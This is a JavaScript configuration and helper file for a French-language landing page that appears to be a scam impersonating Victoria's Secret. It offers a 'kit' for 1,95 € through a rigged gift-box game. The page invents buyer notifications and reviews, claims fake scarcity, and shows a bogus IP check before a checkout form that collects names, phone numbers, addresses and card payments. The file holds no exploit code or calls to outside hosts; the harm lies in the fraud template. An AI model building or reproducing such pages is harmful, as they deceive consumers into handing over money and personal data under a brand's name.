const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

(function (exp) {
  const countryCode = "fr";
  const lang = "fr-FR";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Taille : ",
    arr: [
      "EU 38.5",
      "EU 39",
      "EU 40",
      "EU 40.5",
      "EU 41",
      "EU 42",
      "EU 42.5",
      "EU 43",
      "EU 44",
      "EU 44.5",
      "EU 45",
      "EU 45.5",
      "EU 46",
      "EU 47",
      "EU 47.5",
      "EU 48.5",
      "EU 49.5",
      "EU 50.5",
      "EU 51.5",
      "EU 52.5",
    ],
  };

  const mainProduct = {
    header: "Nouveau | Économisez 380 €",
    name: "Brume Aromatique",
    oldPrice: "410 €",
    newPrice: "1,95 €",
    selectText: "Parfum : ",
    text: `
    Félicitations!!! <br><br>
    Vous participez à la campagne Victoria's Secret : vous avez la chance de gagner une crème et une brume corporelle de la collection Mist pour seulement <b>1,95 €</b>!
    <br><br>
    Pour recevoir un ensemble de la collection Mist, veuillez répondre à quelques questions et confirmer que vous êtes une personne réelle.
    <br><br>
    Dépêchez-vous, le nombre de kits est limité à 100!
  `,
  };

  const notifications = [
    {
      user: "Sophie S*****",
      location: "Paris, France",
      action: "Je viens d'acheter le kit Mist pour 1,95 €.",
      timeago: "il y a 15 secondes",
    },
    {
      user: "Jacqueline B******",
      location: "Lyon, France",
      action: "Je viens d'acheter le kit Mist pour 1,95 €.",
      timeago: "il y a 25 secondes",
    },
  ];

  const reviewsArr = [
    {
      name: "Ema",
      time: "il y a 1 jour",
      header: "Grande amour",
      image: "./assets/rw1.jpg",
      product: "26468778",
      review:
        "Le parfum de vanille est doux, longue durée, je peux l'utiliser toute la journée, je l'adore, je l'emporte partout avec moi et quand je sens que j'ai besoin d'une touche de parfum, je l'ajoute simplement.",
    },
    {
      name: "Hana",
      time: "il y a 2 jours",
      header: "Un parfum magnifique !",
      product: "26468776",
      review:
        "Pure Seduction est mon préféré. Je reçois beaucoup de compliments quand je le porte.",
    },
    {
      name: "Julija",
      time: "il y a 3 jours",
      header: "Aqua Kiss est tout simplement incroyable.",
      product: "26468779",
      image: "./assets/rw3.jpg",
      review:
        "Cette brume corporelle sent incroyablement bon et vous ne serez pas déçu. L'arôme est agréable et très persistant, ce qui est rare aujourd'hui. Comme une trousse de maquillage, idéale pour voyager, elle s'adapte partout et ne prend pas beaucoup de place - je suis très satisfaite de mon achat!",
    },
    {
      name: "Mia",
      time: "il y a 5 jours",
      header: "Amour",
      review:
        "Mon préféré acheté il y a trois ans est aussi le préféré de ma fille.",
    },
    {
      name: "Lilly",
      time: "il y a 9 jours",
      header: "Incroyable",
      image: "./assets/rw5.jpg",
      product: "26468777",
      review:
        "J'ai acheté ce parfum pour l'anniversaire de ma mère, et après l'avoir utilisé, j'ai immédiatement demandé à le reprendre. Il sent tellement bon et le parfum persiste, juste une pulvérisation avant de quitter la maison et ça sent toute la journée. Je donne à ce produit un 10/10",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "AVIS ET ÉVALUATIONS",
    percent: "99%",
    rec: "Nous recommandons cet article",
  };

  const questions = {
    _of: "Une question {1} sur {2}",
    arr: [
      {
        q: "Avez-vous déjà acheté des produits Victoria's Secret?",
        a: ["Oui", "Non"],
      },
      {
        q: "Pour qui est cet achat?",
        a: [
          "Pour mon ami(e)",
          "Pour ma sœur",
          "Pour ma mère",
          "Pour moi",
        ],
      },
      {
        q: "Recommanderiez-vous nos produits à vos amis?",
        a: ["Oui", "Non"],
      },
    ],
  };

  const check = {
    title: "Votre réponse sera vérifiée",
    arr: [
      "Vous avez répondu aux questions 3/3.",
      "Votre adresse IP n'indique pas de demandes antérieures.",
      "Votre réponse a été confirmée.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Félicitations, vous avez confirmé que vous êtes une personne réelle",
        button: "OK",
        text: `
          <center>
          Aujourd'hui, {date}, vous avez la chance de gagner un ensemble de spray et crème Victoria's Secret.
            <br><br>
          Tout ce que vous avez à faire est de choisir la bonne boîte cadeau.
            <br><br>
          Vous avez trois essais, bonne chance!
          </center>
        `,
      },
    },
    first: {
      texts: {
        header: "Oh non...",
        button: "OK",
        text: `
          <center>
          Oh non, désolé, ce cadeau est vide ! Vous avez encore deux essais - bonne chance!
          </center>
        `,
      },
    },
    win: {
      texts: {
        header: "Félicitations, vous avez gagné!",
        button: "OK",
        text: `
          <center>Vous avez reçu un ensemble de spray et crème Victoria's Secret
          
            <br>
              1) Cliquez sur "OK" pour accéder à la page d'envoi.
              <br>
              2) Remplissez le formulaire et payez pour recevoir le spray corporel.
              <br>
              3) Votre commande sera expédiée sous 5 à 6 jours.
          </center>
        `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Informations personnelles",
      fields: {
        name: {
          enabled: true,
          field: "Nom",
        },
        family: {
          enabled: true,
          field: "Nom de famille",
        },
        phone: {
          enabled: true,
          field: "Numéro de téléphone",
        },
        email: {
          enabled: true,
          field: "E-mail",
        },
      },
    },
    delivery: {
      title: "Livraison",
      fields: {
        city: {
          enabled: true,
          field: "Ville",
        },
        address: {
          enabled: true,
          field: "Adresse de livraison",
        },
        zip: {
          enabled: true,
          field: "Code postal",
        },
      },
    },
    payment: {
      title: "Méthodes de paiement",
      creditCard: "Paiement en ligne par carte",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Récapitulatif de la commande",
      oldPrice: "410 €",
      newPrice: "1,95 €",
      size: "Taille",
      subTotal: {
        title: "Valeur de la commande",
        amount: "1,95 €",
      },
      delivery: {
        title: "Livraison",
        amount: "0 €",
      },
      total: {
        title: "Total",
        amount: "1,95 €",
      },
      checkoutButton: "Payer votre commande",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "Midnight Bloom",
      miniImg: "./assets/vs1_s.jpg",
      desc: `
     Description du parfum
      <br>
      - Type : sensuel et coloré
      <br>
      - Fleurs de lune. Bois crémeux. Amour prédestiné.
      `,
      images: [
        "./assets/vs1_1.png",
        "./assets/vs1_2.jpg",
        "./assets/vs1_3.jpg",
      ],
    },
    {
      id: "26468779",
      name: "Aqua Kiss",
      miniImg: "./assets/vs2_s.jpg",
      desc: `
      Description du parfum
      <br>
      - Type : frais
      <br>
      - Eau douce. Marguerite lumineuse. Plongez dans l'eau.
      `,
      images: [
        "./assets/vs2_1.png",
        "./assets/vs2_2.jpg",
        "./assets/vs2_3.jpg",
      ],
    },
    {
      id: "26546832",
      name: "Pear Glacé",
      miniImg: "./assets/vs3_s.jpg",
      desc: `
     Description du parfum
      <br>
      - Type : fruité
      <br>
      - Poire douce. Melon couvert de rosée. Oh là là!
      `,
      images: [
        "./assets/vs3_1.png",
        "./assets/vs3_2.jpg",
        "./assets/vs3_3.jpg",
      ],
    },
    {
      id: "26468777",
      name: "Velvet Petals",
      miniImg: "./assets/vs4_s.jpg",
      desc: `
     Description du parfum
      <br>
      - Type : fruit gourmet
      <br>
      - Bouquet juteux. Amandes glacées. Un soupir.
      `,
      images: [
        "./assets/vs4_1.png",
        "./assets/vs4_2.jpg",
        "./assets/vs4_3.jpg",
      ],
    },
    {
      id: "26468778",
      name: "Bare Vanilla",
      miniImg: "./assets/vs5_s.jpg",
      desc: `
      Description du parfum
      <br>
      - Type : Gourmet
      <br>
      - Vanille avec crème fouettée. Cachemire doux. Peau contre peau.
      `,
      images: [
        "./assets/vs5_1.png",
        "./assets/vs5_2.jpg",
        "./assets/vs5_3.jpg",
      ],
    },
    {
      id: "26546829",
      name: "Strawberries & Champagne",
      miniImg: "./assets/vs6_s.jpg",
      desc: `
    Description du parfum
      <br>
      -Type : fruité-floral
      <br>
      -Fraises sauvages. Champagne pétillant. Bulles et bulles.
      `,
      images: [
        "./assets/vs6_1.png",
        "./assets/vs6_2.jpg",
        "./assets/vs6_3.jpg",
      ],
    },
    {
      id: "26468776",
      name: "Pure Seduction",
      miniImg: "./assets/vs7_s.jpg",
      desc: `
    Description du parfum
      <br>
      - Type : fruit
      <br>
      - Jus de prune. Freesia écrasé. En pleine nuit.
      `,
      images: [
        "./assets/vs7_1.png",
        "./assets/vs7_2.jpg",
        "./assets/vs7_3.jpg",
      ],
    },
    {
      id: "26468775",
      name: "Love Spell",
      miniImg: "./assets/vs8_s.jpg",
      desc: `
     Description du parfum
      <br>
      -Type : fruité-floral
      <br>
      - Fleur de cerisier. Pêche fraîche. Totalement irrésistible.
      `,
      images: [
        "./assets/vs8_1.png",
        "./assets/vs8_2.jpg",
        "./assets/vs8_3.jpg",
      ],
    },
  ];

  const footer = {
    cr: "2024 Victoria's Secret. Tous droits réservés.",
  };


  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

const siteKey = "victory-fr";

function setCookie(name, value, days = 2) {
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = `${siteKey + name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
}

function getCookie(name) {
  var dc = document.cookie;
  var prefix = (siteKey + name) + "=";
  var begin = dc.indexOf("; " + prefix);
  if (begin == -1) {
    begin = dc.indexOf(prefix);
    if (begin != 0) return null;
  }
  else {
    begin += 2;
    var end = document.cookie.indexOf(";", begin);
    if (end == -1) {
      end = dc.length;
    }
  }
  return decodeURI(dc.substring(begin + prefix.length, end));
}

const clearAllCookies = () => document.cookie.split(';').forEach(c => document.cookie = c.replace(/^ +/, '').replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`));

const clearSiteSpecificCookies = () => {
  document.cookie.split(';').forEach(cookie => {
    // Trim any leading spaces from the cookie string
    const trimmedCookie = cookie.trim();

    // Extract the cookie name
    const cookieName = trimmedCookie.split('=')[0];

    // Check if the cookie name starts with the siteKey
    if (cookieName.startsWith(siteKey)) {
      // Set the cookie's expiration to a past date to delete it
      document.cookie = `${cookieName}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/`;
    }
  });
};


const starupCheck = () => {
  if (getCookie("__firstStart") != null) {
    return;
  } else {
    localStorage.clear();
    clearSiteSpecificCookies();
    setCookie("__firstStart", true);
  }
};


window.addEventListener("load", () => {
  starupCheck();
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});



const lsSelectProduct = (val) =>
  setCookie("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = getCookie("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => setCookie("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = getCookie("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => setCookie("__step", val);
const lsGetStep = () => {
  const step = getCookie("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
